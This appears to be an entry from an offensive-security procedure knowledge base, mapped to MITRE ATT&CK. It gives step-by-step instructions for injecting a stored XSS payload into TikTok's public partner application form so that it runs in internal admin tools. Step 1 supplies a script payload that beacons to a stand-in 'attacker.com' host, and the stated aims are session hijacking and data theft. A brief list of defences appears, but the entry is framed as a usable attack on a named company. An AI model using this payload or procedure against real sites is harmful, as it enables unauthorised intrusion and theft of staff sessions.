---
id: proc-tiktok-xss-injection
tags:
  - xss
  - stored-xss
  - injection
  - web
type: procedure
tools:
  - '[[tools/Web-Browser]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:20.921Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-into-Partner-Form

## Summary

This procedure exploits a lack of input sanitization in TikTok's public partner application form to inject a stored XSS payload, which is persisted in the backend and later rendered in internal administrative interfaces.

## Description

The attack targets a publicly accessible web form used for partner applications. By submitting malicious JavaScript in form fields, the payload bypasses validation, gets stored in the database, and propagates to internal systems like Dorado/DataLeap. When viewed by privileged users, it executes in their browser context. Prerequisites include public access to the form; no authentication is needed. Expected outcomes: payload storage and eventual execution leading to session hijacking.

## Requirements

1. Web browser for form submission
2. Public internet access to the target form URL
3. An external server to receive exfiltrated data (e.g., for payload callback)

## Defense

Defensive measures and detection strategies:

- Implement server-side input validation and HTML/JS escaping on all form fields
- Use Content Security Policy (CSP) to restrict script execution in internal tools
- Monitor for anomalous data submissions and employee session logs for unexpected JS execution

## Objectives

1. Persist malicious JavaScript in the target's backend storage
2. Ensure propagation to administrative views
3. Set up for subsequent execution and data theft

## Instructions

### Step 1: Access and Prepare the Form

**Context**: Navigate to the public partner application form and identify injectable fields, such as text areas for descriptions or comments.

No specific command; use a web browser to load the form at the target URL (e.g., TikTok's partner signup page).

> Prepare a payload like `<script>var i=new Image();i.src='https://attacker.com/log?'+document.domain;</script>` to test storage without immediate execution.

### Step 2: Submit the Malicious Payload

**Context**: Inject the payload into a form field and submit to store it unfiltered.

Use the browser's form submission interface to enter and send the payload.

> Upon submission, the payload is stored without sanitization, confirming success via any success message or backend logs if accessible.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Web-Browser]]

## Tags

- [[xss]]
- [[injection]]
